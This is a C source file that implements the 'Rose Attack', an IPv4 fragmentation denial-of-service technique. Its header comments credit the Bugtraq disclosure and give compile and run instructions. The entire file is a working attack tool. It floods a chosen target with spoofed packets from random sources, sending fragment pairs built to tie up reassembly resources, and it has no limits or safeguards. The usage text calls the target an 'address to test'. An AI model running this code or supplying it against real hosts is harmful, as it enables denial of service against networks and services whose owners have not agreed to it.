

/*-------------------------------------------------------------*/
/*
  Implementation of Rose Attack described by Gandalf <gandalf@digital.net>.
  Reference: Bugtraq, 30 mars 2004, "IPv4 fragmentation, The Rose Attack"


  Written by Laurent Constantin

  Library netwib must be installed:
    http://www.laurentconstantin.com/en/netw/netwib/
    http://go.to/laurentconstantin

  To compile :
    gcc -Wall -o rose rose.c `netwib-config -lc`
  To compile on Mac OS :
    gcc -Wall -o rose rose.c `/usr/local/bin/netwib-config -lc`

  To Run:
    ./rose 1 www.example.com 80
    
  This was successfully tested with netwib 5.35.0, under Linux
   and Mac OS/X to test a host. Local network is Ethernet.
  
  Revision History:
  20061112 - Change "netwib_buf_init_ext_text" to 
             "netwib_buf_init_ext_string".  Correct for netwib
             Version 5.35.0 updates.
 
*/

/*-------------------------------------------------------------*/
#include <stdlib.h>
#include <stdio.h>
#include <netwib.h>

/*-------------------------------------------------------------*/
typedef enum {
  ROSE_TYPE_TCP = 1,
  ROSE_TYPE_UDP = 2
} rose_type;

/*-------------------------------------------------------------*/
typedef struct {
  rose_type type;
  netwib_ip ipad;
  netwib_port port;
  netwib_bool display;
  netwib_buf buf;
  netwib_io *pio;
} rose_params;

/*-------------------------------------------------------------*/
static netwib_err rose_loop(rose_params *prp)
{
  netwib_iphdr ipheader;
  netwib_tcphdr tcpheader;
  netwib_udphdr udpheader;
  netwib_buf payload;
  netwib_uint32 numsent = 0;

  /* This can be optimized because ipheader for example does not
     need to be initialized each time. However, this is easier
     to understand. */

  while (NETWIB_TRUE) {
  	 if( numsent%1000 == 0)
    		usleep(1);
    /* construct first fragment */
    netwib__buf_reinit(&prp->buf);
    netwib_er(netwib_iphdr_initdefault(NETWIB_IPTYPE_IP4, &ipheader));
    ipheader.header.ip4.morefrag = NETWIB_TRUE;
    ipheader.header.ip4.offsetfrag = 0; /* not necessary, but to be clear */
    ipheader.src.iptype = NETWIB_IPTYPE_IP4;
    netwib_er(netwib_uint32_init_rand_all(&ipheader.src.ipvalue.ip4));
    ipheader.dst = prp->ipad;
    switch(prp->type) {
    case ROSE_TYPE_TCP :
      netwib_er(netwib_tcphdr_initdefault(&tcpheader));
      netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &tcpheader.src));
      if (prp->port == 0) {
        netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &tcpheader.dst));
      } else {
        tcpheader.dst = prp->port;
      }
      tcpheader.ack = NETWIB_TRUE;
      netwib_er(netwib_buf_init_ext_string("1234567890123456789012345678",
                                         &payload));
      netwib_er(netwib_pkt_append_iptcpdata(&ipheader, &tcpheader, &payload,
                                          &prp->buf));
      break;
    case ROSE_TYPE_UDP :
      netwib_er(netwib_udphdr_initdefault(&udpheader));
      netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &udpheader.src));
      if (prp->port == 0) {
        netwib_er(netwib_uint32_init_rand(0, 0xFFFF, &udpheader.dst));
      } else {
        udpheader.dst = prp->port;
      }
      netwib_er(netwib_buf_init_ext_string("12345678901234567890123456789012",
                                         &payload));
      netwib_er(netwib_pkt_append_ipudpdata(&ipheader, &udpheader, &payload,
                                            &prp->buf));
      break;
    }
    if (prp->display) {
      netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,
                                      NETWIB_ENCODETYPE_DUMP));
    }
    netwib_er(netwib_io_write(prp->pio, &prp->buf));
    
    /* construct last fragment */
    netwib__buf_reinit(&prp->buf);
    ipheader.header.ip4.morefrag = NETWIB_FALSE;
    ipheader.header.ip4.offsetfrag = 0x1FF0;
    switch(prp->type) {
    case ROSE_TYPE_TCP :
      ipheader.protocol = NETWIB_IPPROTO_TCP;
      break;
    case ROSE_TYPE_UDP :
      ipheader.protocol = NETWIB_IPPROTO_UDP;
      break;
    }
    netwib_er(netwib_buf_init_ext_string("12345678901234567890123456789012",
                                       &payload));
    netwib_er(netwib_pkt_append_ipdata(&ipheader, &payload, &prp->buf));
    if (prp->display) {
      netwib_er(netwib_pkt_ip_display(&prp->buf, NULL, NETWIB_ENCODETYPE_ARRAY,
                                      NETWIB_ENCODETYPE_DUMP));
    }
    netwib_er(netwib_io_write(prp->pio, &prp->buf));

    /* dot display */
    if (!prp->display && (numsent%100)==0) {
      printf("."); fflush(stdout);
    }
    numsent++;
  }

  return(NETWIB_ERR_OK);
}

/*-------------------------------------------------------------*/
int main(int argc, char* argv[])
{
  rose_params rp;
  netwib_buf ipstr;
  netwib_err ret;

  /* initialize netwib */
  netwib_init();

  /* check parameter count */
  if (argc < 3 || argc > 4) {
    printf("Usage  : %s type(1or2) ipaddress [port]\n", argv[0]);
    printf("Example: %s 1 1.2.3.4 80\n", argv[0]);
    printf(" type     : %d=tcp, %d=udp\n", ROSE_TYPE_TCP, ROSE_TYPE_UDP);
    printf(" ipaddress: address to test\n");
    printf(" port     : optional port number (0 means random)\n");
    return(1);
  }

  /* first parameter is type */
  rp.type = atoi(argv[1]);
  switch(rp.type) {
  case ROSE_TYPE_TCP :
  case ROSE_TYPE_UDP :
    break;
  default :
    printf("First parameter must be 1 or 2 (currently=%s)\n", argv[1]);
    return(2);
  }

  /* second parameter is IP address */
  netwib_er(netwib_buf_init_ext_string(argv[2], &ipstr));
  ret = netwib_ip_init_buf(&ipstr, NETWIB_IP_DECODETYPE_BEST, &rp.ipad);
  if (ret != NETWIB_ERR_OK) {
    printf("Second parameter must be an IP or hostname (currently=%s)\n",
           argv[2]);
    return(3);
  }

  /* third parameter is port number */
  rp.port = 0;
  if (argc == 4) {
    rp.port = atoi(argv[3]); /* on error, set to 0, but that's ok */
  }

  /* set to NETWIB_TRUE to activate display */
  rp.display = NETWIB_FALSE;

  /* instead of allocating memory each time, just use this permanent buffer */
  netwib_er(netwib_buf_init_mallocdefault(&rp.buf));

  /* initialize spoofing feature */
  netwib_er(netwib_io_init_spoof_ip(NETWIB_SPOOF_IP_INITTYPE_LINKBRAW,
                                    &rp.pio));

  /* main function */
  ret = rose_loop(&rp);
  if (ret != NETWIB_ERR_OK) {
    netwib_er(netwib_err_display(ret, NETWIB_ERR_ENCODETYPE_FULL));
    return(ret);
  }

  /* close netwib */
  netwib_er(netwib_io_close(&rp.pio));
  netwib_er(netwib_buf_close(&rp.buf));
  netwib_close();

  return(0);
}

